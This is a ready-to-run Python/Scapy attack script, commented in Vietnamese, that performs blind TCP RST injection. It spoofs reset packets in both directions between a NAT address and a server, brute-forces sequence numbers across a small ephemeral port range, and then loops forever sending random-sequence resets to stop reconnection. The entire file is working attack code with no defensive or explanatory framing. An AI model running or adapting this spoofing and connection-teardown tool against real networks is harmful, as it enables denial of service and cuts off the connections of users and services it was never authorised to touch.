#!/usr/bin/env python3
"""
blind_rst.py — RST Brute-Force không cần spy oracle
====================================================
Bỏ qua Stage 1 (Port Discovery). Vì range nhỏ (40000–40010),
gửi RST cả 2 hướng cho TẤT CẢ ports với SEQ tăng dần.

Dùng khi spy probe không hoạt động.

Chạy: sudo python3 blind_rst.py
"""

import sys, time, random
from scapy.all import IP, TCP, send, conf

NAT_PUBLIC_IP = "1.1.1.1"
SERVER_IP     = "1.1.1.10"
SERVER_PORT   = 8080
IFACE         = "ens33"

EPHEM_START = 40000
EPHEM_END   = 40011        # 40000–40010 inclusive
STEPS       = 1000         # Đủ để cover SEQ space (2^32/1000 = ~4M spacing)
BATCH       = 5000         # Gói/batch

def tear_down_all():
    """Gửi RST cả 2 hướng cho toàn bộ port range — TẤT CẢ CÙNG LÚC."""
    print(f"[*] Tear-down: RST brute-force {EPHEM_START}–{EPHEM_END-1}")
    print(f"    {STEPS} SEQ × 2 dir × {EPHEM_END-EPHEM_START} ports = {STEPS*2*(EPHEM_END-EPHEM_START)} pkts")
    step_sz = (2**32) // STEPS
    ports = list(range(EPHEM_START, EPHEM_END))

    pkts = []
    for port in ports:
        for i in range(STEPS):
            seq = (i * step_sz) % (2**32)
            pkts.append(IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
                       TCP(sport=SERVER_PORT, dport=port, flags="R", seq=seq))
            pkts.append(IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
                       TCP(sport=port, dport=SERVER_PORT, flags="R", seq=seq))

    print(f"    Sending {len(pkts)} packets...", end=" ", flush=True)
    send(pkts, iface=IFACE, verbose=False, inter=0)
    print("done ✓")

def carpet_bomb():
    """Vòng lặp RST vô hạn để chặn reconnect."""
    print(f"\n[*] CARPET BOMB (Ctrl+C để dừng)")
    ports = list(range(EPHEM_START, EPHEM_END))
    sweep = 0
    while True:
        pkts = []
        for p in ports:
            for _ in range(50):
                seq = random.randint(0, 2**32-1)
                pkts.append(IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
                           TCP(sport=SERVER_PORT, dport=p, flags="R", seq=seq))
                pkts.append(IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
                           TCP(sport=p, dport=SERVER_PORT, flags="R", seq=seq))
        send(pkts, iface=IFACE, verbose=False, inter=0)
        sweep += 1
        print(f"    Sweep #{sweep}: {len(pkts)} RST sent")
        time.sleep(0.1)

if __name__ == "__main__":
    print("=" * 50)
    print("  BLIND RST — No Oracle Required")
    print("=" * 50)
    print(f"  NAT   : {NAT_PUBLIC_IP}")
    print(f"  Server: {SERVER_IP}:{SERVER_PORT}")
    print(f"  Ports : {EPHEM_START}–{EPHEM_END-1}")

    tear_down_all()
    print("\n[✓] Tear-down done. Starting carpet bomb...")
    try:
        carpet_bomb()
    except KeyboardInterrupt:
        print("\n[!] Stopped.")
